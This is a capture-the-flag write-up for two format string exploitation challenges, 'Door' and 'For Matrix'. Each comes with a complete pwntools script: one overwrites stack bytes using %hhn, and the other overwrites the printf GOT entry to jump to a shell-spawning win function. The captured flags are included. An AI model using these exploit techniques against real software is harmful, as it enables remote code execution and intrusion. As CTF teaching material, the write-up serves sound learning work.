# Door

> Flag: FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoid2FyNC1kb29yIiwiaXAiOiIyMDIuODcuMTYyLjI4Iiwic2Vzc2lvbiI6IjllYTg3YzU0LWIwYjItNGUyMS1hYjVkLTA2YjJhMGViMTAxNSJ9.Zglm3dj4pU0GjsgcDdyhB7uFTieyWUYfMTBHQS5_ij0}

## Scenario

There is a vulnerable printf function that is 0x200 bytes long.  
There are four bytes at ebp-0x5 that need to be overwritten to 'A', 'P', 'E', 'S'

## Solution

Perform a format string attack with the vulnerable printf function to overwrite the four bytes.  
When overwriting byte-by-byte, `%hhn` should be used.  
An offset of 1 byte was required to byte-align the values.

## Script

```python3
from pwn import *
import re

p = process("./door")
p = remote('plsdonthaq.me', 4001)

p.recvuntil(b'A landslide has blocked the way at ')

landSlideAddress = int(p.recvline(keepends=False), 16)
print(f"ebp-0x5 = {hex(landSlideAddress)}")

ebp = landSlideAddress + 0x5
print(f"Calculated ebp = {hex(ebp)}")

## fgets(ebp-0x205, 0x200, stdin)
## printf(ebp-0x205)

# We want to overwrite the contents at ebp-0x205 to be "APES"
payload = b''
payload += b'.' # Offset
payload += p32(landSlideAddress)   # Write 65
payload += p32(landSlideAddress+1) # Write 80
payload += p32(landSlideAddress+2) # Write 69
payload += p32(landSlideAddress+3) # Write 83
# 17 characters already used

p.sendline(payload + b'%48c%2$hhn' + b'yeet%4$hhn' + b'%11c%3$hhn' + b'lol%5$hhn')
#               17      + 48 = 65        + 4 = 69       + 11 = 80       + 3 = 83

p.interactive()

```

---

# For Matrix

> Flag: `FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoid2FyNC1mb3JtYXRyaXgiLCJpcCI6IjIwMi44Ny4xNjIuMjgiLCJzZXNzaW9uIjoiYjdmNWU1MTEtMzU1Ni00ZTgxLWJmZWYtNzZiOTM2YTUwMjBlIn0.Wdz38UVHLuCjsYl7tNDFYM33ltvbVUcSEIDTYj4-SCM}`

## Scenario

There is a format string vulnerable `sprintf` function that allows a user to enter in up to 512 bytes.  
This format string will then be evaluated, meaning that we can override either the `puts` or `printf` GOT entry to point to the `win` function.

## Solution

We have a choice of either overwriting the `puts` or `printf` function.  
The `win` function however, also uses the `puts` function. So as to prevent an infinite loop, we'll override the `printf` function instead.  

We can push the four addresses of the bytes containing the `printf` GOT entry, and then write in the bytes with `%hhn`.  

## Script

```python3
from pwn import *
import re

p = process("./formatrix")
p = remote('plsdonthaq.me', 4003)

# fgets(ebp-0x208, 0x200, stdin)
# sprintf(ebp-0x608, ep-0x208)

# There is a win() function which will pop our shell
# Either overwrite puts, or printf.  
# However, the win function also uses puts, so we don't want to cause an infinite loop.
# Override printf!

printf_GOT = 0x8049c18 # From the ELF

""" Time for some quick maffs

Win Address = 0x8048536 (From the ELF)

We're going to inject the values one byte at a time.  
To do, we'll need to start the string with the four addresses of each byte for the printf GOT.  

0x08 -> addr+3
0x04 -> addr+2
0x85 -> addr+1
0x36 -> addr+0

Due to needing to include the addresses, %n write will start of as >= 16.  
We'll start at 0x36, then go to 0x85, then overflow to 0x04, then go to 0x08

0x36 -> addr+0
0x85 -> addr+1
0x04 -> addr+2
0x08 -> addr+3

# Oh hey it's just reverse order!
"""

'''
payload = b"AAAA"+ b" %p" * 10
AAAA 0xf77885a0 0x804858c 0x41414141 0x66783020 0x38383737 0x20306135 0x30387830 0x38353834 0x78302063 0x31343134

We can read our string at the third 4-byte index i.e. %3$p
'''

payload = b""
payload += p32(printf_GOT+0)
payload += p32(printf_GOT+1)
payload += p32(printf_GOT+2)
payload += p32(printf_GOT+3)

payload += b"." * (0x36 - len(payload))
payload += b'%3$hhn'

payload += b"." * (0x85 - 0x36)
payload += b'%4$hhn'

payload += b"." * ((0x04 - 0x85) % 0x100) # Note to future me: Don't mod 0xFF, it's 0x100.
payload += b'%5$hhn'

payload += b"." * (0x08 - 0x04)
payload += b'%6$hhn'

p.sendline(payload)
p.interactive()
```